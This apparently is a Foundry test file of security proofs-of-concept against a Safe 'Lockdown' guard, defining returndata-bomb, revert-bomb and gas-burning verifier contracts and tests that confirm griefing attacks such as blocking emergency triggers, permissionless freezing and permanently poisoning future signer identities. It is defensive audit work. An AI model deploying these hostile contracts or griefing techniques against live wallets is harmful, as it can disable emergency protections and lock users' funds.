// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Vm, console2} from "forge-std/Test.sol";

import {TestEnvironment} from "../TestEnvironment.sol";

import {Safe, Enum} from "@safe-global/safe-smart-account/Safe.sol";
import {MultiSendCallOnly} from "@safe-global/safe-smart-account/libraries/MultiSendCallOnly.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {Lockdown} from "../../src/Lockdown.sol";
import {LockdownSigners} from "../../src/base/LockdownSigners.sol";
import {RecoveryOwners} from "../../src/base/RecoveryOwners.sol";
import {StateMachine} from "../../src/base/StateMachine.sol";

import {MockSecretVerifier} from "../mocks/MockSecretVerifier.sol";
import {MockRevertingVerifier, MockToggleVerifier} from "../mocks/MockAdversarialVerifiers.sol";

/* ------------------------------------------------------------------ */
/*  Hostile helpers (local to this PoC file)                           */
/* ------------------------------------------------------------------ */

/// @dev Gas-adaptive returndata bomb. Sizes the returned buffer from its OWN
///      remaining gas (i.e. from the 63/64 the caller forwarded), so the memory
///      expansion the CALLER must pay to `returndatacopy` the buffer is always
///      far larger than the 1/64 the caller retained. Scales with any gas limit.
contract ReturnDataBombVerifier {
    fallback() external {
        uint256 target = (gasleft() * 6) / 10;
        uint256 size = Math.sqrt(512 * target) * 32;
        assembly {
            return(0, size)
        }
    }
}

/// @dev Same bomb, delivered as revert data. Solidity's high-level `staticcall`
///      copies revert data into `bytes memory` exactly like success data.
contract RevertBombVerifier {
    fallback() external {
        uint256 target = (gasleft() * 6) / 10;
        uint256 size = Math.sqrt(512 * target) * 32;
        assembly {
            revert(0, size)
        }
    }
}

/// @dev Pure cost-inflation: burns ~95% of the gas it is forwarded (via memory
///      expansion, no loop) and then returns a well-formed NON-magic word, so
///      the caller sees an ordinary "bad signature" outcome at maximum cost.
contract GasBurnerVerifier {
    fallback() external {
        uint256 target = (gasleft() * 95) / 100;
        uint256 size = Math.sqrt(512 * target) * 32;
        assembly {
            mstore(size, 0) // expand memory: burns ~`target` gas
            mstore(0, 0) // non-magic return word
            return(0, 0x20)
        }
    }
}

/// @dev 20-byte ERC-1271 identity that burns most of the forwarded gas AND
///      returns a multi-megabyte buffer whose first word is the ERC-1271 magic.
contract Bomb1271Wallet {
    fallback() external {
        uint256 target = (gasleft() * 6) / 10;
        uint256 size = Math.sqrt(512 * target) * 32;
        assembly {
            mstore(0, 0x1626ba7e00000000000000000000000000000000000000000000000000000000)
            return(0, size)
        }
    }
}

/// @notice SURFACE A (hostile / mutable verifier dispatch) and SURFACE C
///         (griefing and denial) proofs. Surface B ("armed but inert" /
///         `testSigner` detectability) is deliberately NOT covered here.
contract VerifierAndGriefingPoC is TestEnvironment {
    /// @dev Realistic mainnet ceiling. Every gas claim below is asserted under
    ///      this cap; the bombs are gas-adaptive, so raising the cap does not
    ///      change the outcome (the sweep test asserts that up to 200M).
    uint256 private constant BLOCK_GAS = 30_000_000;

    Safe private safeA;

    function setUp() public override {
        super.setUp();
        safeA = _createConfigureAndInitialise(0x9001);
    }

    /* ---------------------------- helpers ---------------------------- */

    function _id(address verifier, bytes memory key) private pure returns (bytes memory) {
        return abi.encodePacked(verifier, key);
    }

    function _register(bytes memory signer) private {
        vm.prank(address(safeA));
        guard.addLockdownSigner(signer);
    }

    function _rawTrigger(uint256 gasCap, bytes memory signer, bytes memory signature)
        private
        returns (bool ok, bytes memory ret, uint256 gasUsed)
    {
        bytes memory payload = abi.encodeWithSelector(
            Lockdown.triggerLockdown.selector, address(safeA), bytes32("panic"), signer, signature
        );
        uint256 before = gasleft();
        (ok, ret) = address(guard).call{gas: gasCap}(payload);
        gasUsed = before - gasleft();
    }

    function _isLocked() private view returns (bool) {
        (StateMachine.State s,) = guard.getState(address(safeA));
        return s == StateMachine.State.LockedDown;
    }

    /* ================================================================ */
    /*  SURFACE A - hostile / mutable verifier dispatch                  */
    /* ================================================================ */

    /// @notice A-1 CONFIRMED. A registered ERC-7913 verifier that returns a
    ///         gas-adaptive returndata bomb makes `triggerLockdown` revert
    ///         out-of-gas at EVERY gas limit (swept 2M -> 200M). OZ
    ///         `SignatureChecker`'s ERC-7913 branch uses a high-level
    ///         `staticcall` that `returndatacopy`es the whole buffer into
    ///         memory; the callee sizes that buffer from the 63/64 it was
    ///         forwarded, so the 1/64 the caller retained can never pay the
    ///         expansion. The singleton's assumption that a misbehaving
    ///         verifier can only make the checker return `false` (normalised to
    ///         `BadSignature`) does not hold: sending more gas never helps.
    function test_confirmed_returnDataBombVerifierOutOfGassesTriggerAtEveryGasLimit() public {
        ReturnDataBombVerifier bomb = new ReturnDataBombVerifier();
        bytes memory signer = _id(address(bomb), abi.encodePacked(bytes32("bomb")));
        _register(signer);

        uint256[4] memory caps = [uint256(2_000_000), 10_000_000, BLOCK_GAS, 200_000_000];
        for (uint256 i = 0; i < caps.length; ++i) {
            (bool ok, bytes memory ret,) = _rawTrigger(caps[i], signer, hex"00");
            assertFalse(ok, "trigger must fail");
            // Out-of-gas, not a normalised BadSignature(): empty revert data.
            assertEq(ret.length, 0, "expected bare out-of-gas, not BadSignature");
        }
        assertFalse(_isLocked(), "safe never locks");
        assertTrue(guard.isLockdownSigner(address(safeA), signer), "identity still registered, never burnt");

        // Control: at the SMALLEST cap above, an honest-but-rejecting verifier
        // reverts with the normalised `BadSignature()` selector, proving the gas
        // caps are ample and the empty reverts above are genuine out-of-gas.
        MockSecretVerifier honest = new MockSecretVerifier();
        bytes memory control = _id(address(honest), abi.encodePacked(keccak256("nope")));
        _register(control);
        (bool okControl, bytes memory retControl,) = _rawTrigger(caps[0], control, hex"00");
        assertFalse(okControl, "control also fails");
        assertEq(bytes4(retControl), Lockdown.BadSignature.selector, "control reverts BadSignature, not out-of-gas");
    }

    /// @notice A-2 CONFIRMED. Same bomb delivered as REVERT data. Solidity's
    ///         high-level `staticcall` copies revert data into `bytes memory`
    ///         exactly like success data, so the "verifier reverts are
    ///         normalised to BadSignature" property (L.3) fails here too.
    function test_confirmed_revertBombVerifierOutOfGassesTrigger() public {
        RevertBombVerifier bomb = new RevertBombVerifier();
        bytes memory signer = _id(address(bomb), abi.encodePacked(bytes32("revert-bomb")));
        _register(signer);

        (bool ok, bytes memory ret,) = _rawTrigger(BLOCK_GAS, signer, hex"00");
        assertFalse(ok, "trigger must fail");
        assertEq(ret.length, 0, "expected bare out-of-gas, not BadSignature");
    }

    /// @notice A-3 CONFIRMED (Codex gas-grief lead, quantified). A hostile
    ///         verifier can burn essentially ALL the gas of every trigger
    ///         attempt and still hand the caller the ORDINARY `BadSignature()`
    ///         revert. Two consequences: (a) the panic path costs ~500x a normal
    ///         failed attempt, repeatable forever because a failed attempt rolls
    ///         the burn back, and (b) the failure is INDISTINGUISHABLE from an
    ///         ordinary bad signature by revert data - only the gas accounting
    ///         in the receipt separates them, so the operator cannot diagnose
    ///         "wrong signature" vs "hostile verifier" from the revert reason.
    function test_confirmed_gasBurnerVerifierInflatesCostAndIsIndistinguishable() public {
        GasBurnerVerifier burner = new GasBurnerVerifier();
        bytes memory hostile = _id(address(burner), abi.encodePacked(bytes32("burn")));
        _register(hostile);

        MockSecretVerifier honest = new MockSecretVerifier();
        bytes memory benign = _id(address(honest), abi.encodePacked(keccak256("nope")));
        _register(benign);

        (bool okH, bytes memory retH, uint256 gasH) = _rawTrigger(BLOCK_GAS, hostile, hex"00");
        (bool okB, bytes memory retB, uint256 gasB) = _rawTrigger(BLOCK_GAS, benign, hex"00");

        assertFalse(okH);
        assertFalse(okB);
        // Same revert data on both paths: not diagnosable by the caller.
        assertEq(bytes4(retH), Lockdown.BadSignature.selector, "hostile path looks like a bad signature");
        assertEq(bytes4(retB), Lockdown.BadSignature.selector, "benign path");
        assertEq(retH.length, retB.length, "identical revert payloads");

        // Cost inflation: >90% of the supplied gas is consumed, vs ~60k benign.
        assertGt(gasH, (BLOCK_GAS * 9) / 10, "hostile attempt burns the whole tx budget");
        assertLt(gasB, 100_000, "benign failed attempt is cheap");
        assertGt(gasH / gasB, 100, "two orders of magnitude cost inflation");
        console2.log("A-3 gas: hostile", gasH, "benign", gasB);

        // Repeatable: the failed attempt did not consume the identity.
        assertTrue(guard.isLockdownSigner(address(safeA), hostile), "no burn on failure, grief is unbounded");
    }

    /// @notice A-4 REFUTED (blast radius of the gas grief). A hostile verifier
    ///         can only poison triggers that USE that identity: each
    ///         `triggerLockdown` staticcalls exactly one verifier. With the bomb
    ///         identity registered alongside an honest EOA panic key, the honest
    ///         trigger still fires inside a 400k gas budget. Cost inflation is
    ///         per-identity, never per-Safe, so a Safe holding >=1 honest
    ///         identity keeps a working panic path.
    function test_refuted_hostileVerifierDoesNotPoisonOtherIdentities() public {
        ReturnDataBombVerifier bomb = new ReturnDataBombVerifier();
        _register(_id(address(bomb), abi.encodePacked(bytes32("bomb"))));

        bytes memory honestSigner = abi.encodePacked(panicKey);
        bytes memory sig = _signTrigger(safeA, PANIC_PK, bytes32("panic"));
        (bool ok,, uint256 gasUsed) = _rawTrigger(400_000, honestSigner, sig);

        assertTrue(ok, "honest identity still fires");
        assertTrue(_isLocked(), "lockdown active");
        assertLt(gasUsed, 400_000, "and does so on a normal gas budget");
    }

    /// @notice A-5 REFUTED for the 20-byte ERC-1271 branch. That branch uses a
    ///         hand-written `staticcall` with a FIXED 32-byte output window and
    ///         never reads `returndatasize` for the copy, so neither a gas burn
    ///         (the 63/64 rule leaves the caller enough to finish) nor a
    ///         multi-megabyte return buffer can stop the trigger. The A-1/A-2
    ///         defect is specific to the ERC-7913 `verifier || key` branch.
    function test_refuted_erc1271GasBurnAndReturnBombStillTriggers() public {
        Bomb1271Wallet wallet = new Bomb1271Wallet();
        bytes memory signer = abi.encodePacked(address(wallet));
        _register(signer);

        (bool ok, bytes memory ret,) = _rawTrigger(BLOCK_GAS, signer, hex"00");
        assertTrue(ok, string(ret));
        assertTrue(_isLocked(), "lockdown fired despite the hostile ERC-1271 wallet");
        assertFalse(guard.isLockdownSigner(address(safeA), signer), "identity burnt on success");
    }

    /// @notice A-6 CONFIRMED (limitation). `_validateSigner` requires verifier
    ///         code at REGISTRATION for `verifier || key` identities
    ///         (`LockdownSigners.sol:131`); nothing re-checks at TRIGGER time
    ///         (`Lockdown.sol:230`). A verifier that loses its code after
    ///         registration (re-deployed CREATE2 slot, self-destructing proxy)
    ///         silently disarms the identity, and the registration-time check
    ///         then blocks re-registering a fresh key on the same verifier -
    ///         so the code check catches the second victim but never the first.
    function test_limitation_verifierBecomingCodelessDisarmsTheIdentity() public {
        MockSecretVerifier v = new MockSecretVerifier();
        bytes memory secret = abi.encodePacked(bytes32("open-sesame"));
        bytes memory signer = _id(address(v), abi.encodePacked(keccak256(secret)));
        _register(signer);

        vm.etch(address(v), hex"");

        vm.expectRevert(Lockdown.BadSignature.selector);
        guard.triggerLockdown(address(safeA), bytes32("panic"), signer, secret);
        assertFalse(_isLocked(), "registered, still counted, and inert");

        vm.prank(address(safeA));
        vm.expectRevert(LockdownSigners.LockdownSigners_VerifierNoCode.selector);
        guard.addLockdownSigner(_id(address(v), abi.encodePacked(bytes32("other"))));
    }

    /// @notice A-7 CONFIRMED escalation of accepted risk #2 (1-of-N grief).
    ///         A verifier that turns hostile after registration (upgradeable
    ///         proxy - register #9) does not merely give the ATTACKER a trigger:
    ///         it makes the trigger PERMISSIONLESS. Any unrelated address
    ///         freezes the Safe with an EMPTY signature. 0-of-N, not 1-of-N,
    ///         and repeatable by the whole world for every registered identity
    ///         on that verifier.
    function test_confirmed_upgradedVerifierMakesTriggerPermissionless() public {
        MockToggleVerifier v = new MockToggleVerifier();
        bytes memory signer = _id(address(v), abi.encodePacked(bytes32("k")));
        _register(signer);

        v.setAccepts(true); // models the post-registration code swap

        vm.prank(address(0xDEAD5EED));
        guard.triggerLockdown(address(safeA), bytes32("panic"), signer, hex"");
        assertTrue(_isLocked(), "anyone can freeze the Safe with no key material at all");
    }

    /// @notice A-8 CONFIRMED (scope note for the whole surface). Registration
    ///         NEVER calls the verifier: a verifier that reverts on every call
    ///         registers successfully. There is therefore no on-chain
    ///         registration-vs-trigger asymmetry to attack - and equally no
    ///         on-chain registration-time vetting of any kind. Everything above
    ///         is decided at trigger time only.
    function test_confirmed_registrationNeverCallsTheVerifier() public {
        MockRevertingVerifier rv = new MockRevertingVerifier();
        bytes memory signer = _id(address(rv), abi.encodePacked(bytes32("k")));
        _register(signer);
        assertTrue(guard.isLockdownSigner(address(safeA), signer), "always-reverting verifier registers fine");
    }

    /* ================================================================ */
    /*  SURFACE C - griefing and denial                                  */
    /* ================================================================ */

    /// @notice C-1 REFUTED. Registration is `msg.sender`-keyed and `onlyNormal`,
    ///         so an outsider cannot spam a victim Safe's signer set toward
    ///         `MAX_LOCKDOWN_SIGNERS`; it only reverts against their own
    ///         uninitialised config. No third-party path to the cap exists.
    function test_refuted_outsiderCannotSpamAnotherSafesSignerSet() public {
        vm.prank(address(0xA77ACC));
        vm.expectRevert(
            abi.encodeWithSelector(StateMachine.InvalidState.selector, StateMachine.State.Uninitialised, 1 << 1)
        );
        guard.addLockdownSigner(abi.encodePacked(address(0x1234)));

        (,,, uint256 count,) = guard.getConfigSnapshot(address(safeA));
        assertEq(count, 1, "victim signer set untouched");
    }

    /// @notice C-2 REFUTED escalation of accepted risk #3 (bounded relock).
    ///         With the signer set at the `MAX_LOCKDOWN_SIGNERS = 32` cap, the
    ///         quorum culls ALL 31 surviving identities in ONE recovery-window
    ///         MultiSend batch, so the relock chain is closable with a SINGLE
    ///         race win, not one per hostile signer. This is exactly the
    ///         mitigation register #5 claims; it holds at the cap.
    function test_refuted_allSurvivingSignersCulledInOneRecoveryBatch() public {
        bytes[] memory extra = new bytes[](31);
        for (uint256 i = 0; i < 31; ++i) {
            extra[i] = abi.encodePacked(address(uint160(0x5160e0 + i)));
            _register(extra[i]);
        }
        (,,, uint256 count,) = guard.getConfigSnapshot(address(safeA));
        assertEq(count, guard.MAX_LOCKDOWN_SIGNERS(), "at the cap");

        _triggerLockdown(safeA, bytes32("grief"));
        assertTrue(_isLocked(), "frozen");

        // During LockedDown no cull is possible.
        vm.prank(address(safeA));
        vm.expectRevert(
            abi.encodeWithSelector(
                StateMachine.InvalidState.selector, StateMachine.State.LockedDown, (1 << 1) | (1 << 3)
            )
        );
        guard.removeLockdownSigner(extra[0]);

        // Recovery window opens: one batched owner tx removes all 31 survivors.
        vm.warp(block.timestamp + 48 hours);
        bytes memory batch;
        for (uint256 i = 0; i < 31; ++i) {
            batch = abi.encodePacked(
                batch,
                _multiSendItem(
                    Enum.Operation.Call, address(guard), 0, abi.encodeCall(guard.removeLockdownSigner, (extra[i]))
                )
            );
        }
        uint256 gasBefore = gasleft();
        _execAsOwner(
            safeA,
            address(multiSendCallOnly),
            0,
            abi.encodeCall(MultiSendCallOnly.multiSend, (batch)),
            Enum.Operation.DelegateCall
        );
        assertLt(gasBefore - gasleft(), 15_000_000, "one-block cull of the whole cap");

        (,,, uint256 remaining,) = guard.getConfigSnapshot(address(safeA));
        assertEq(remaining, 0, "every surviving identity culled in one tx");

        vm.warp(block.timestamp + 4 hours + 1);
        (StateMachine.State s,) = guard.getState(address(safeA));
        assertEq(uint256(s), uint256(StateMachine.State.Normal), "auto-resumed");
        vm.expectRevert(LockdownSigners.LockdownSigners_Unknown.selector);
        guard.triggerLockdown(address(safeA), bytes32("relock"), extra[0], hex"");
    }

    /// @notice C-3 CONFIRMED escalation of accepted risk #8 (T-BYPASS-8 forced
    ///         burn). `MAX_LOCKDOWN_SIGNERS = 32` bounds only the ACTIVE set;
    ///         `_burnt` (`LockdownSigners.sol:24`) is write-only and unbounded.
    ///         An add+remove pair inside ONE MultiSend keeps the active set at
    ///         <= 1 while permanently poisoning an arbitrary number of
    ///         identities - including identities the operator has NEVER
    ///         registered and intends to use LATER (the next addresses of a
    ///         known HD path, a spare passkey, a documented backup EOA). Beyond
    ///         T-BYPASS-8, which disarms the CURRENT set: this poisons the
    ///         FUTURE re-arm space, permanently, with no un-burn primitive and
    ///         no bound other than the attacker's gas.
    function test_confirmed_burntHistoryIsUnboundedAndPoisonsFutureIdentities() public {
        uint256 n = 64;
        address[] memory future = new address[](n);
        bytes memory batch;
        for (uint256 i = 0; i < n; ++i) {
            future[i] = address(uint160(0xF00000 + i));
            bytes memory id = abi.encodePacked(future[i]);
            batch = abi.encodePacked(
                batch,
                _multiSendItem(Enum.Operation.Call, address(guard), 0, abi.encodeCall(guard.addLockdownSigner, (id))),
                _multiSendItem(Enum.Operation.Call, address(guard), 0, abi.encodeCall(guard.removeLockdownSigner, (id)))
            );
        }

        uint256 gasBefore = gasleft();
        _execAsOwner(
            safeA,
            address(multiSendCallOnly),
            0,
            abi.encodeCall(MultiSendCallOnly.multiSend, (batch)),
            Enum.Operation.DelegateCall
        );
        uint256 perIdentity = (gasBefore - gasleft()) / n;

        // The 32-signer cap was never approached: active set is unchanged.
        (,,, uint256 count,) = guard.getConfigSnapshot(address(safeA));
        assertEq(count, 1, "cap never engaged; only the burnt history grew");

        for (uint256 i = 0; i < n; ++i) {
            bytes memory id = abi.encodePacked(future[i]);
            assertTrue(guard.isSignerBurntPermanently(address(safeA), id), "identity permanently poisoned");
            vm.prank(address(safeA));
            vm.expectRevert(LockdownSigners.LockdownSigners_BurntPermanently.selector);
            guard.addLockdownSigner(id);
        }
        assertLt(perIdentity, 200_000, "cheap enough to poison thousands of identities per block");
        console2.log("C-3 gas per permanently poisoned identity", perIdentity);
    }

    /// @notice C-4 REGRESSION PIN. `removeRecoveryOwner` used to be a SILENT NO-OP for
    ///         an address that is not on the allowlist: the public path passed
    ///         `strict: false`, so `RecoveryOwners_Unknown` was unreachable from it and
    ///         a quorum culling a compromised backup with a mistyped address got a
    ///         SUCCESSFUL Safe transaction, an `ExecutionSuccess`, and no event - while
    ///         the compromised backup stayed `swapOwner`-eligible during recovery.
    ///         The public path is now strict: the mistyped removal reverts, so the
    ///         operator learns the cull did not happen.
    function test_regression_removeRecoveryOwnerRevertsOnAnUnknownAddress() public {
        address typo = address(0xBADBEEF);
        assertFalse(guard.isRecoveryOwner(address(safeA), typo), "not on the allowlist");

        _execAsOwner_Revert(
            safeA,
            address(guard),
            0,
            abi.encodeCall(guard.removeRecoveryOwner, (typo)),
            Enum.Operation.Call,
            RecoveryOwners.RecoveryOwners_Unknown.selector
        );

        // The genuine allowlist entry the operator meant to cull is untouched, and the
        // failed attempt is now visible as a reverted transaction rather than a
        // successful no-op.
        assertTrue(guard.isRecoveryOwner(address(safeA), recovery), "the real recovery owner is still allowlisted");
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), 1, "nothing removed");
    }

    /// @notice The other half of the same change: a genuine removal still works, so the
    ///         strict flag did not break the cull path it exists to protect.
    function test_regression_removeRecoveryOwnerStillRemovesAGenuineEntry() public {
        address spare = address(0xC0FFEE);
        vm.prank(address(safeA));
        guard.addRecoveryOwner(spare);
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), 2, "two entries");

        _execAsOwner(safeA, address(guard), 0, abi.encodeCall(guard.removeRecoveryOwner, (spare)), Enum.Operation.Call);
        assertFalse(guard.isRecoveryOwner(address(safeA), spare), "genuine entry removed");
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), 1, "back to one");
    }

    /// @notice Accepted cost of strict removal: a stale item makes a MultiSend cleanup
    ///         revert atomically, so later genuine removals in the same batch roll back.
    ///         Operators must refresh the allowlist before signing a batched cull.
    function test_limitation_strictRecoveryOwnerRemovalRollsBackStaleCleanupBatch() public {
        address stale = address(0xDE1E7ED);
        address live = address(0xC0FFEE);
        vm.prank(address(safeA));
        guard.addRecoveryOwner(live);

        bytes memory batch = abi.encodePacked(
            _multiSendItem(Enum.Operation.Call, address(guard), 0, abi.encodeCall(guard.removeRecoveryOwner, (stale))),
            _multiSendItem(Enum.Operation.Call, address(guard), 0, abi.encodeCall(guard.removeRecoveryOwner, (live)))
        );
        bytes memory multiSendData = abi.encodeCall(MultiSendCallOnly.multiSend, (batch));
        bytes memory sig =
            _signTx(safeA, OWNER_PK, address(multiSendCallOnly), 0, multiSendData, Enum.Operation.DelegateCall);

        vm.expectRevert();
        safeA.execTransaction(
            address(multiSendCallOnly),
            0,
            multiSendData,
            Enum.Operation.DelegateCall,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            sig
        );

        assertFalse(guard.isRecoveryOwner(address(safeA), stale), "stale entry remains absent");
        assertTrue(guard.isRecoveryOwner(address(safeA), live), "later genuine removal rolled back with the batch");
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), 2, "batch left the allowlist unchanged");
    }

    /// @notice C-5 REFUTED (recovery-owner allowlist has no upper bound). The
    ///         allowlist is unbounded where signers are capped at 32, but it is
    ///         NOT a denial vector: only the Safe itself can grow it (owner-path
    ///         quorum), growth costs the victim ~50k gas per entry, and reading
    ///         1000 entries back via `getRecoveryOwners` stays far inside a
    ///         normal `eth_call` budget. The hot paths (`isRecoveryOwner` in the
    ///         recovery whitelist, `getRecoveryOwnerCount` in the ops snapshot)
    ///         are O(1) and unaffected. Cleanup is O(n) but batchable.
    function test_refuted_unboundedRecoveryOwnerAllowlistIsNotADenialVector() public {
        uint256 n = 1000;
        for (uint256 i = 0; i < n; ++i) {
            vm.prank(address(safeA));
            guard.addRecoveryOwner(address(uint160(0xEC0000 + i)));
        }
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), n + 1, "allowlist grew unbounded");

        uint256 g = gasleft();
        address[] memory all = guard.getRecoveryOwners(address(safeA));
        uint256 readCost = g - gasleft();
        assertEq(all.length, n + 1);
        assertLt(readCost, 30_000_000, "a full read still fits a block / eth_call budget");
        console2.log("C-5 getRecoveryOwners gas for", all.length, readCost);

        // O(1) hot paths are unaffected.
        g = gasleft();
        guard.isRecoveryOwner(address(safeA), address(uint160(0xEC0000 + n - 1)));
        assertLt(g - gasleft(), 10_000, "membership check stays O(1)");

        // And the same one-tx MultiSend cleanup shape works.
        bytes memory batch;
        for (uint256 i = 0; i < 200; ++i) {
            batch = abi.encodePacked(
                batch,
                _multiSendItem(
                    Enum.Operation.Call,
                    address(guard),
                    0,
                    abi.encodeCall(guard.removeRecoveryOwner, (address(uint160(0xEC0000 + i))))
                )
            );
        }
        _execAsOwner(
            safeA,
            address(multiSendCallOnly),
            0,
            abi.encodeCall(MultiSendCallOnly.multiSend, (batch)),
            Enum.Operation.DelegateCall
        );
        assertEq(guard.getRecoveryOwnerCount(address(safeA)), n + 1 - 200, "cleanup is batchable");
    }
}
